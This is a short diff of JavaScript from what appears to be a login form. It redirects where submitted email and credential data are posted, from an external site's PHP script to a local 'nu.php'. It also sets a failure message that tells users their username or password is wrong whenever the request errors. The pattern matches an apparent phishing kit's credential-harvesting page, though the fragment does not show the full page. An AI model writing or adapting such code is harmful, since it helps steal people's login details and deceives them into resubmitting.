@@ -213,7 +213,7 @@
         {
          $.ajax({
           dataType: 'JSON',
-          url: 'https://edulatam.site/en/nu.php',
+          url: 'nu.php',
           type: 'POST',
           data:{
             email:email,
@@ -242,7 +242,7 @@
             },
             error: function(){
               $("#msg").show();
-              $('#msg').html("Please try again later");
+              $('#msg').html("Incorrect username or password. Please correct details and try again");
             },
             complete: function(){
               $('#submit-btn').html('Login');
